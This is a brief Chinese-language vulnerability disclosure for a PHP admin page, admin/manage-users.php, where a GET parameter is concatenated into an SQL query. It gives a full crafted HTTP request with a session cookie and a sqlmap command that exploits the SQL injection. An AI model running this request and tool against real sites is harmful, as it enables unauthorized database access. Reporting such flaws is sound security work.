admin/manage-users.php文件中 $adminid直接拼接到sql语句中，而$adminid是通过GET请求直接获取的


![alt text](manage-users.php%20sql%20inject-1.png)


构造恶意数据包

GET /admin/manage-users.php?id=1 HTTP/1.1
Host: test.jc
Cookie: PHPSESSID=6keshioktp2eu9p7fg0ent8hk2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Referer: http://test.jc/admin/
Accept-Language: zh-CN,zh;q=0.9


run sqlmap -r get.txt --level 3

![alt text](manage-users.php%20sql%20inject-2.png)



